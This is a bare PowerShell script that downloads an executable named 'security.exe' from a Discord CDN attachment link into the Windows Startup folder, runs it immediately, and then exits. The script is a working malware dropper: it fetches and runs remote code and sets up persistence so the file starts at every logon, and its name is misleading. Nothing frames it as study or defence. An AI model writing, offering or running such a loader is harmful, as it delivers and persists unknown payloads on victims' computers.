$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://cdn.discordapp.com/attachments/1342936036614869114/1345801143145463839/security.exe?ex=67c5de7c&is=67c48cfc&hm=ac97b9f34bbd2cfd3df89c0a047baf3ed294e230afc70ce9c2e04a4f0fbe9aab&"
$outputPath = Join-Path $startupFolder "security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

& $outputPath
Start-Sleep -Seconds 3
[System.Environment]::Exit(0)
